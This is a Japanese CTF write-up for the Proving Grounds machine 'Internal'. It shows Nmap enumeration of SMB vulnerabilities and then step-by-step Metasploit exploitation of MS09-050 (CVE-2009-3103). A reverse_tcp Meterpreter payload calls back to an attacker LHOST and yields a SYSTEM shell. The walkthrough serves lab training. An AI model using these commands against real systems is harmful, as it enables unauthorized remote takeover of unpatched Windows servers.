+++
title = "Proving Grounds Practice - Internal Writeup"
date = "2026-10-10"
description = "MS09-050 (SMBv2 Negotiate Protocol Request)の脆弱性を悪用し、Metasploitで直接SYSTEM権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[SMB]", "[MS09-050]", "[Metasploit]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field   | Details |
| ------- | ------- |
| Machine | Internal |
| OS      | Windows |

---

## Reconnaissance

### Nmap Scan (TCP)

```bash
nmap -sV -sC -p- 192.168.116.40
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152-49158/tcp open msrpc    Microsoft Windows RPC
```

### Nmap Scan (UDP)

```bash
nmap -sU -sC 192.168.116.40
```

```text
53/udp   open          domain
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
3702/udp open|filtered ws-discovery
4500/udp open|filtered nat-t-ike
5355/udp open|filtered llmnr
```

特に目立った追加情報はありませんでした。

### SMB Enumeration

```bash
nmap --script "smb-*" 192.168.116.40
```

SMBスクリプトの結果から、以下の重要な情報が得られました。

```text
smb-security-mode:
  account_used: <blank>
  authentication_level: user
  challenge_response: supported
  message_signing: disabled (dangerous, but default)

smb-protocols:
  dialects:
    NT LM 0.12 (SMBv1) [dangerous, but default]
    2.0.2

smb-brute:
  guest:<blank> => Valid credentials, account disabled
```

さらに脆弱性スキャンの結果、2件のクリティカルな脆弱性が検出されました。

```text
smb-vuln-ms17-010:
  VULNERABLE
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  CVE-2017-0143

smb-vuln-cve2009-3103:
  VULNERABLE
  SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
  Array index error in the SMBv2 protocol implementation in srv2.sys
```

`MS17-010 (EternalBlue)` に加えて、`CVE-2009-3103 (SMBv2 Negotiate Protocol Request)` 

---

## Initial Access

### MS09-050 (SMBv2 Negotiate Protocol Request Memory Corruption)

`CVE-2009-3103` はMetasploitに対応モジュール `exploit/windows/smb/ms09_050_smb2_negotiate_func_index` が存在するため、これを利用します。

```bash
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

ターゲットと攻撃用ホストを設定します。

```bash
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.116.40
RHOSTS => 192.168.116.40
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.45.202
LHOST => 192.168.45.202
```

オプションを確認し、`exploit` を実行します。

```bash
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > exploit
```

Meterpreterセッションが確立しました。権限を確認します。

```bash
meterpreter > getuid
```

```text
Server username: NT AUTHORITY\SYSTEM
```

SMBv2の脆弱性を突いた時点でカーネルレベルの処理に起因する問題のため、特別な権限昇格を行うことなく、**初期アクセスの時点でSYSTEM権限**を取得できました。

シェルへドロップして動作を確認します。

```bash
meterpreter > shell
```

```text
Process 3924 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

---

## Privilege Escalation

本マシンでは `MS09-050` の脆弱性自体がSYSTEM権限での任意コード実行を許すため、**追加の権限昇格は不要**でした。

---

## Summary

今回の攻撃経路は以下の通りです。

```text
Nmap (TCP/UDP)
  ↓
古いWindows Server 2008 SP1を確認
  ↓
smb-vuln-* スクリプトでCVE検出
  ↓
MS17-010 / CVE-2009-3103 (MS09-050) の脆弱性を確認
  ↓
exploit/windows/smb/ms09_050_smb2_negotiate_func_index
  ↓
Metasploitでexploit実行
  ↓
SYSTEM権限でMeterpreterセッション確立
```

### Key Commands

```bash
# Port scan (TCP全ポート)
nmap -sV -sC -p- 192.168.116.40

# Port scan (UDP)
nmap -sU -sC 192.168.116.40

# SMB vulnerability enumeration
nmap --script "smb-*" 192.168.116.40

# Metasploitでのexploit
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf > set RHOSTS 192.168.116.40
msf > set LHOST 192.168.45.202
msf > exploit

# 権限確認
meterpreter > getuid
```
